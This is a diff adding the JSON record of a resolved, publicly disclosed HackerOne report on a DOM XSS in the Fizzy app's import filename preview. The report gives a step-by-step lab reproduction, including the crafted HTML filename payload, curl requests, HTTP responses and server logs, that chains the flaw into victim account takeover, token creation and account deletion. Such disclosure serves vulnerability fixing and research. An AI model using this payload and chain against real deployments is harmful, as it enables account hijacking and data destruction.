@@ -1,0 +1,147 @@
+{
+  "id": 3608199,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4MTk5",
+  "url": "https://hackerone.com/reports/3608199",
+  "title": "DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-16T13:55:59.440Z",
+  "submitted_at": "2026-03-16T13:56:00.066Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "xavlimsg",
+    "url": "/xavlimsg",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ginaiesntilpg69vcvek17vriamy/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-04-14T21:36:22.221Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-13T16:56:50.767Z",
+  "team_member_agreed_on_going_public_at": "2026-04-14T21:36:21.752Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\n\n## Summary:\n\nWhile auditing the latest Fizzy code and validating it end to end in a live Docker deployment of current `main`, I found that the account import page renders the selected local filename with `innerHTML` instead of `textContent`.\n\nIn practice, that means a crafted `.zip` filename is not shown as text. It is parsed as live HTML inside the real authenticated import form on `/account/imports/new`. Because that form already contains the victim's session and a valid CSRF token, I was able to inject a second submit control with an attacker-chosen `formaction` and turn the filename preview into an authenticated request gadget.\n\nI pushed this beyond a theoretical DOM issue and validated the full attack chain to victim account takeover. The strongest demonstrated path was:\n\n1. I made the victim browser submit an email-change request to `attacker@example.com`\n2. Fizzy sent the confirmation link to the attacker-controlled mailbox\n3. I redeemed that confirmation link\n4. Fizzy created a fresh authenticated victim session for me\n5. I accessed the victim account and victim profile edit page with `200 OK`\n\nI also separately validated two additional impacts from the same sink:\n\n- victim write-scoped personal access token creation\n- victim account deletion\n\nThe worst case that I actually demonstrated is full victim account takeover.\n\n## Steps To Reproduce:\n\nI am including a zip bundle with the exact scripts I used. The attachment contains:\n\n- `basecamp_submission__fizzy_do__cwe-79__.md`\n  Purpose: this submission text in markdown form.\n- `2026-03-16_import-filename_dom-xss_api-token.md`\n  Purpose: my full technical write-up with the complete attack path, evidence, and code references.\n- `fizzy_dom_xss_seed.rb`\n  Purpose: seeds the attacker mailbox identity and victim owner account.\n- `fizzy_dom_xss_takeover_chain.sh`\n  Purpose: replays the full account-takeover chain after the victim session exists.\n- `fizzy_dom_xss_account_delete_poc.js`\n  Purpose: reproduces the secondary destructive impact, account deletion, in Playwright.\n- `README.md`\n\n\nI validated on current upstream:\n\n- commit: `4211e20a663eb5ad8d4ca3340a1f8d247472c4dc`\n\n### Setup\n\n1. Check out the latest affected revision and build the app:\n\n```bash\ngit clone https://github.com/basecamp/fizzy.git\ncd fizzy\ngit fetch origin\ngit checkout 4211e20a663eb5ad8d4ca3340a1f8d247472c4dc\ndocker build -t fizzy-main-latest .\n```\n\n2. Start an SMTP capture container and a Fizzy app container:\n\n```bash\ndocker run -d --name fizzy-mailhog-bridge mailhog/mailhog\n\ndocker run -d --name fizzy-ato-poc \\\n  -e SECRET_KEY_BASE=\"$(openssl rand -hex 32)\" \\\n  -e DISABLE_SSL=true \\\n  -e MULTI_TENANT=true \\\n  -e SMTP_ADDRESS=172.17.0.6 \\\n  -e SMTP_PORT=1025 \\\n  -e SMTP_USERNAME=test \\\n  -e SMTP_PASSWORD=test \\\n  -e SMTP_AUTHENTICATION=plain \\\n  -e BASE_URL=http://172.17.0.7:3000 \\\n  fizzy-main-latest \\\n  bash -lc './bin/rails db:prepare && ./bin/rails server -b 0.0.0.0 -p 3000'\n```\n\n3. Seed the attacker mailbox identity and victim owner account:\n\n```bash\ndocker cp fizzy_dom_xss_seed.rb fizzy-ato-poc:/tmp/fizzy_dom_xss_seed.rb\ndocker exec fizzy-ato-poc bash -lc 'bundle exec rails runner /tmp/fizzy_dom_xss_seed.rb'\n```\n\nIn my run, that gave me:\n\n```text\nvictim account slug: /40002\nvictim user id: 03frq8zae2a7m9cari0v89xua\nattacker mailbox: attacker@example.com\nvictim mailbox: victim@example.com\n```\n\n4. Sign in as the victim through the real HTTP flow and keep the victim cookie jar:\n\n```bash\ncurl -s -i -c /workspace/victim_ato.cookies -X POST \\\n  -d email_address=victim@example.com \\\n  http://172.17.0.7:3000/session\n```\n\nThen finish the magic-link sign-in. In my lab I completed real victim authentication before triggering the filename attack.\n\n### Full takeover reproduction\n\n1. Create a local file whose name injects a second submit button into the import form:\n\n```text\n<button formaction=&#47;40002&#47;users&#47;03frq8zae2a7m9cari0v89xua&#47;email_addresses formmethod=post name=email_address value=attacker@example.com>Take over.zip\n```\n\n2. As the logged-in victim, open:\n\n```text\nhttp://172.17.0.7:3000/account/imports/new\n```\n\n3. Select the malicious file. The preview will render a live injected button instead of inert filename text.\n\n4. Click the injected `Take over.zip` control. This causes the victim browser to submit:\n\n```http\nPOST /40002/users/03frq8zae2a7m9cari0v89xua/email_addresses\n```\n\nwith:\n\n- the victim's real authenticated session\n- the page's real CSRF token\n- `email_address=attacker@example.com`\n\n5. Open the attacker mailbox in MailHog and retrieve the `Confirm your new email address` message. It contains a real confirmation URL like:\n\n```text\nhttp://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation\n```\n\n6. Visit that confirmation URL and submit the real confirmation form. Fizzy then responds with:\n\n```http\nHTTP/1.1 302 Found\nLocation: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit\nSet-Cookie: session_token=...; httponly; samesite=lax\n```\n\n7. Reuse that new `session_token` cookie to request:\n\n```text\nGET /40002/\nGET /40002/users/03frq8zae2a7m9cari0v89xua/edit\n```\n\nBoth returned `200 OK` in my validation.\n\n8. Confirm server-side that the victim user identity email changed to `attacker@example.com`.\n\n### What I observed during validation\n\nThe full takeover chain succeeded. These are the exact checkpoints I confirmed:\n\n- victim-side malicious POST to `/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses`\n- confirmation mail delivered to the attacker mailbox\n- successful confirmation POST\n- new attacker-side `session_token`\n- `200 OK` on the victim account and victim profile edit page\n- victim identity now bound to `attacker@example.com`\n\n### Additional validated impacts from the same sink\n\nI also reproduced:\n\n1. Victim write-scoped personal access token creation\n\n```http\nPOST /20002/my/access_tokens\n```\n\n2. Victim account deletion\n\n```http\nPOST /20002/account/cancellation\n```\n\nI included the deletion PoC script in the zip because it is a clean secondary demonstration of the same primitive, but the primary reportable impact is the mailbox-backed account takeover above.\n\n## Supporting Material/References:\n\n### Code references\n\n- `app/javascript/controllers/upload_preview_controller.js`\n- `app/views/account/imports/new.html.erb`\n- `app/controllers/users/email_addresses_controller.rb`\n- `app/controllers/users/email_addresses/confirmations_controller.rb`\n- `app/controllers/account/cancellations_controller.rb`\n\n### Key evidence I captured\n\nVictim-side malicious POST:\n\n```text\nStarted POST \"/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses\" for 172.17.0.2\nProcessing by Users::EmailAddressesController#create as */*\nParameters: {\"authenticity_token\"=>\"[FILTERED]\", \"email_address\"=>\"attacker@example.com\", \"user_id\"=>\"03frq8zae2a7m9cari0v89xua\"}\n[ActiveJob] Enqueued ActionMailer::MailDeliveryJob ... \"UserMailer\", \"email_change_confirmation\"\n```\n\nAttacker mailbox confirmation message:\n\n```text\nSubject: Confirm your new email address\nhttp://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation\n```\n\nAttacker-side confirmation response:\n\n```http\nHTTP/1.1 302 Found\nLocation: http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/edit\nSet-Cookie: session_token=...; httponly; samesite=lax\n```\n\nAttacker-side access after takeover:\n\n```text\nATTACKER_ACCOUNT_HTTP=200\nATTACKER_EDIT_HTTP=200\n{user_identity_email: \"attacker@example.com\", account_slug: \"/40002\"}\n```\n\n### Attachment bundle\n\nI prepared a zip bundle containing the report plus all supporting scripts and notes:\n\n- `basecamp_fizzy_dom_xss_account_takeover_bundle.zip`\n\n## Impact\n\n# Impact\n\nAn external attacker can send a crafted `.zip` file to a logged-in Fizzy owner and, with a single click on the import page, cause the victim browser to submit attacker-chosen same-origin authenticated POST requests using the victim session and the page's valid CSRF token.\n\nThe worst case I actually demonstrated was full victim account takeover. I was able to:\n\n- trigger a victim email change to an attacker-controlled mailbox\n- receive the confirmation link in the attacker mailbox\n- redeem that link\n- obtain a fresh authenticated victim session\n- access the victim account as that victim\n\nI also separately demonstrated:\n\n- victim write-token creation\n- victim account deletion\n\nSo the demonstrated impact is not just UI manipulation or an isolated DOM bug. It is a reliable path to full account compromise, plus destructive integrity and availability impact, from a single user interaction on the import page.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5544972,
+      "file_name": "basecamp_fizzy_dom_xss_account_takeover_bundle.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m6klt592ut8fliy9se8ro0jkp7wn?response-content-disposition=attachment%3B%20filename%3D%22basecamp_fizzy_dom_xss_account_takeover_bundle.zip%22%3B%20filename%2A%3DUTF-8%27%27basecamp_fizzy_dom_xss_account_takeover_bundle.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRTHIU2UX%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145913Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJGMEQCIQClMIEpe0tv%2BQLEug6sEEXvQN2HXLj47w2DKsxsPISrBgIfCEHv8TSaeb3viTuR6LVfgWI%2Fbr40T1K%2FceJt6A5FaSq7BQjn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMLhp3YcJZwwPGu59mKo8FOwLdPN%2FUhlhrV43xrcyCbCLwVoFPFnvRaipbNGP9c1om5hL%2B4LeSSdBv9w7dSVnaFPmXwy6ZGqmJxQVKgzn1dW9wWoJO2DDQV4VUywgSQ%2BNfV0%2FRgp0tx1anfqFtPMeyFgWo%2BIO6eNUKR%2BkDI6Gu49wdzz5akkwltoMJmqjihqqcyi35kpEQdrKp2Wydt7FBGEbZoW%2FI%2F5seJimpX638Aj85n%2Fg9Wfx%2B470vLMMym%2FosvoitLKD7ckhN3v8m7UFhE4ZKQ1UIryjcdhVC8axsv0Xsbr3s7yywbrVXnLKJDSxgz9OQh2rvMSU4TYaI5JIy0qI%2B5OdpKT7Ta9jYlwoNYBDeoc6nGeu6lf8Q3Pdkl46qDEeQO8E9GOvNDW96j8NfC%2BnbfLEmIVsoL3LXTzgr3ZTpETIydOmZfMHV1hS3ui64UKHdauQazq9K3XWL57xEz2e9ukq9j3V8lRc3d%2FW11KD603o3g31q%2FMOjKxT5Dglvfiq%2FpnfTsN5vDzJImxE5iyCWcJU8oWRyDin3K%2BnHdDoUvt4rmQJllSTrr9m6yYWVfvxoc0wywgs%2FJJTZjilNZPKrHPIMkSwdoaVpj%2F0ou9Z9SzS6%2FuCxcjFfke7D%2BaRdJlgoUlDHyMLg61UL0Ez1bTXWDvQH9cp%2FxbODVqRWX4ZibjSIl%2FChkmQxIrWgfhv6mVX0ZFEohZghoB%2Bib1D1LuMsjhjuQ3RwWkT5iGhVbaeKjz2RSumj1iJB8wCq7uqDRNTn%2FCbBYa030LYerB%2B3KB5Q6CD4uVRY1VaFwXAFrLP2XZJHwfzYsE9KQYOrBBeFnT0hCuWwsMcUzkUYnov2HMnkGOoMOIG3Cmsjxn6sCvkWfb7tSRNQhZAnakUJozDQgP3PBjqyAcIk7X7CvLxBfxmeqFcrcynKPo0q%2FR0rwaBjvNy9hYXMhY9p%2FD0Ce6bp14fkCe4zQSKDuN8lmj4x%2FPFiEprLFfT%2FU3B3ISm%2F1SaFq%2Bu4jA7IfEPkNg5IQDqDxVcg7l2MGdC%2BoYkagsNCCk8zOGtonj0VlnSemGLfS%2BTvR%2FFQsyysHudYR02Q9gAy7Ji%2B77PicrW6J5bw9oEwLA1oMiA4pD%2FxsRgAsqgCZloaf0NYbX5qTc4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=32f11901340bda1e7aa088dfd23aefd0e90d4f765c89a26f6122c4e8dc2a55b5",
+      "file_size": 18457,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-05-13T16:56:50.898Z",
+  "allow_singular_disclosure_after": 352657.009279854,
+  "singular_disclosure_allowed": false,
+  "vote_count": 62,
+  "voters": [
+    "pwoer",
+    "zy9ard3",
+    "trptt",
+    "mohaned0101",
+    "2026",
+    "xavlimsg",
+    "v8k2xf",
+    "anom5x",
+    "nwicks",
+    "scrutalis",
+    "and 52 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 974588,
+    "asset_type": "URL",
+    "asset_identifier": "fizzy.do",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
